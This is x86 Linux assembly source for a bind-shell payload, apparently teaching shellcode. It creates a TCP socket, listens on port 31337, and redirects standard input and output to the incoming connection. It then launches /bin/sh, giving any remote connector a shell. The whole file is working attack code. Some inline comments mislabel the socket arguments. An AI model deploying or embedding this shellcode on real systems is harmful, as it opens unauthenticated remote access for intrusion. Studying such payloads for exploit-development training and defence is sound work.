global _start                                                                                                                                     
                                                                                                                                                  
section .text                                                                                                                                     
                                                                                                                                                  
_start:                                                                                                                                           
                                                                                                                                                 
socket:                                                                                                                                          
        xor eax, eax    ; Zeroing out eax                                                                                                        
        mov al, 0x66    ; Setting the syscall (SYS_SOCKETCALL) number to eax                                                                     
                                                                                                                                                 
        xor ebx, ebx    ; Zeroing out ebx                                                                                                        
        mov bl, 0x01    ; Setting the first argument (SYS_SOCKET)                                                                                
                                                                                                                                                 
        xor ecx, ecx    ; Zeroing out ecx                                                                                                        


                                                                                                                                                 
        push byte 0x06  ; Setting Domain = TCP                                                                                                    
        push byte 0x01  ; Setting Type = SOCK_STREAM                                                                                             
        push byte 0x02  ; Setting Protocol = PF_INET                                                                                             

        mov ecx, esp    ; ECX points to the arguments                                                                                            
        int 0x80                                                                                                                                 
                                                                                                                                                 
        xor edi, edi    ; Zeroing out edi                                                                                                        
        xchg eax, edi   ; Exchanging the values between eax and edi to assign sockfd to edi                                                      
                                                                                                                                                 
bind:                                                                                                                                            
        push eax        ; Setting sin_addr = INADDR_ANY ("Address to accept any incoming messages.")                                             
                                                                                                                                                 
        xor ebx, ebx    ; Zeroing out ebx                                                                                                        
        mov bl, 0x02    ; Setting the first argument (SYS_BIND)                                                                                  
                                                                                                                                                 
        push word 0x697A        ; Port 31337 in hex                                                                                          
        push word 0x02          ; Setting sin_family = AF_INET

        mov ecx, esp    ; ECX points to the arguments
        push 0x10       ; Pushing addrlen value to the stack (16 bytes)

        push ecx        ; Pushing the structure addr*

        push edi        ; Pushing sockfd to the stack
        mov ecx, esp    ; ECX points to the arguments

        mov al, 0x66    ; Setting the syscall (SYS_SOCKETCALL) number to eax                                                                     
        int 0x80

listen:
        mov al, 0x66    ; Setting the syscall (SYS_SOCKETCALL) number to eax                                                                     
        mov bl, 0x04    ; Setting the first argument to SYS_LISTEN

        push 0x01       ; Pushing the maximum queue size for pending connections (backlog) to the stack                                          
        push edi        ; Pushing sockfd to the stack

        mov ecx, esp    ; ecx points to the arguments
        int 0x80

accept:
        mov al, 0x66    ; Setting the syscall (SYS_SOCKETCALL) number to eax                                                                     
        inc bl          ; Increasing bl by one, to set the second argument to SYS_ACCEPT                                                         

        push edx        ; Pushing NULL to the stack for addrlen argument
        push edx        ; Pushung NULL to the stack for addr argument
        push edi        ; Pushing sockfd to the stack

        mov ecx, esp    ; ECX points to the arguments
        int 0x80

dup2:
        mov ebx, eax    ; New socketfd
        xor eax, eax    ; Zeroing out eax
        xor ecx, ecx    ; Zeroing out ecx
        mov cl, 0x02    ; Setting cl to 2 (stdin)

lp:
        mov al, 0x3f    ; Setting the syscall (SYS_DUP2) number to eax
        int 0x80        ;
        dec ecx         ; Decrease ecx by one, to set stdout and stderr
        jns lp          ; Jump if not sign (positive value) - loop

execve:
        xor eax, eax    ; Zeroing out eax
        push eax        ; Pushing NULL to terminate "/bin//sh"
        push 0x68732f2f ; "hs//"
        push 0x6e69622f ; "nib/"
        mov ebx, esp    ; EBX points to "/bin//sh"


        push eax        ; Pushing NULL to the stack
        mov edx, esp    ; Setting envp argument

        push ebx        ; Pushing the address
        mov ecx, esp    ; Setting argv argument

        mov al, 0x0B    ; Setting the syscall (SYS_EXECVE) number to eax
        int 0x80
